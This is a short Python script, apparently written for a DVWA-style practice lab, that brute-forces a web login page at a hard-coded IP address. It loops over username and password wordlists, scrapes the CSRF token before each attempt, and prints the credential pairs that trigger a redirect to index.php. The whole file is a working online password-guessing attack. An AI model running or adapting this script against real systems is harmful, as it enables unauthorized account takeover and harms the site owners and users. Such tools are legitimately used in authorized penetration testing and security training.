import requests
from bs4 import BeautifulSoup

# ✅ Correct URL for your setup
url = "http://16.170.155.63/login.php"
success_redirect = "index.php"

# 📂 Wordlists
user_file = "/home/kali/Desktop/Maintesting/wordfile/usersbrue.txt"
pass_file = "/home/kali/Desktop/Maintesting/wordfile/passwordsbrue.txt"

# Load users and passwords
with open(user_file) as uf:
    usernames = [line.strip() for line in uf if line.strip()]

with open(pass_file) as pf:
    passwords = [line.strip() for line in pf if line.strip()]

# Start session
session = requests.Session()

for username in usernames:
    for password in passwords:
        # 🛡️ Get CSRF token if present
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        token_input = soup.find("input", {"name": "user_token"})
        token = token_input["value"] if token_input else ""

        # 🔐 Prepare login data
        data = {
            "username": username,
            "password": password,
            "Login": "Login"
        }
        if token:
            data["user_token"] = token

        # 🚀 Send login POST request
        login_response = session.post(url, data=data, allow_redirects=False)

        # ✅ Check if redirected to index.php (success)
        if "Location" in login_response.headers and success_redirect in login_response.headers["Location"]:
            print(f"[+] SUCCESS: {username}:{password}")
        else:
            print(f"[-] Failed: {username}:{password}")
